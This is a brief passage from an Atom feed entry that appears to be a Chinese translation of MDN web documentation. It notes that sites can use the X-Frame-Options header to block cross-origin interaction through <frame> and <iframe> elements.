<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame"><code>&lt;frame&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</p>

]]></content>
  </entry>
  
</feed>
